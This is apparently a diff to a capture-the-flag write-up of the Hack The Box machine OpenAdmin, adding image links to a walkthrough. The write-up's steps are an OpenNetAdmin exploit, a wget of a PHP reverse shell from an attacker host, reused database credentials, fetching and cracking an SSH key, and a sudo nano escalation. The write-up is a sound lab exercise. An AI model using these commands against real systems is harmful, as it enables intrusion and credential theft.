@@ -46,11 +46,11 @@ Lets see if there are any vulnerabilities for OpenNetAdmin (ONA):
 
 After looking at the proof of concept found in exploitdb, we just need to edit the URL to point to the ONA web application:
 
-![poc]()
+![poc](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/poc.png)
 
 Execute the bash script with the changes and we get a limited shell on the machine:
 
-![shell]()
+![shell](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/shell.png)
 
 We are dropped in the /opt/www/ona directory, which is the root for ONA
 
@@ -69,44 +69,44 @@ wget http://10.10.14.152:8000/php-reverse-shell.php
 curl http://10.10.10.171/ona/php-reverse-shell.php
 ```
 
-![phpshell]()
+![phpshell](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/phpshell.png)
 
 I tried to access the user.txt file in the home directories of both users but was denied:
 
-![userdeny]()
+![userdeny](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/userdeny.png)
 
 After looking through the /var/www/ona directory (linked to /opt/ona/www), I found a database configuration file with a password:
 
-![dbfile]()
+![dbfile](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/dbfile.png)
 
 Lets try to ssh with the credentials jimmy:n1nj4W4rri0R!:
 
-![jimmy_shell]()
+![jimmy_shell](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/jimmyshell.png)
 
 ## Pivoting to User 2
 
 Success!  But there is no user.txt file in jimmy's home directory:
 
-![jimmyhome]()
+![jimmyhome](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/jimmyhome.png)
 
 Jimmy cannot sudo on this device or access joanna's home directory.  Looking through the webroot /var/www I found an interesting directory called internal:
 
-![internal]()
+![internal](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/internal.png)
 
 Let's look at main.php:
 
-![main]()
+![main](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/main.png)
 
 So if we connect to this webserver, we should receive the private key (id_rsa) for joanna which we can then use to login.  Lets see if the we are listening on port 80:
 
-![netstat]()
+![netstat](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/netstat.png)
 
 The target is not listening on port 80, but is listening on port 52846, so lets try to connect to that to retrieve the private key:
 
 ```
 curl http://127.0.0.1:52846/main.php
 ```
-![rsa]()
+![rsa](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/rsa.png)
 
 We got the private key, but the message from main.php indicates that this private key is password protected, so we will need to use ssh2john (link) and john to crack the password:
 
@@ -119,21 +119,21 @@ Now crack it with john:
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
 ```
-![john]()
+![john](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/john.png)
 
 The password for id_rsa is bloodninjas, which goes along with the hint of "ninja" password we saw in the id_rsa.  Now lets try to login as joanna using the private key:
 
-![joanna_shell]()
+![joanna_shell](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/joannashell.png)
 
 ## User File 
 
-![userfile]()
+![userfile](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/userfile.png)
 
 ## Privilege Escalation
 
 Start by checking if joanna is allowed to run any commands with sudo:
 
-![sudol]()
+![sudol](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/sudol.png)
 
 Looks like we can open the file priv using nano with root privilieges:
 ```
@@ -141,8 +141,8 @@ Sudo /bin/nano /opt/priv
 ```
 There is a native ability in nano to read (CTRL+R) any file in the file system that you specify.  Lets try to read the root.txt file:
 
-![nanoroot]()
+![nanoroot](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/nanoroot.png)
 
 ## Root File 
 
-![rootfile]()
+![rootfile](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/rootfile.png)
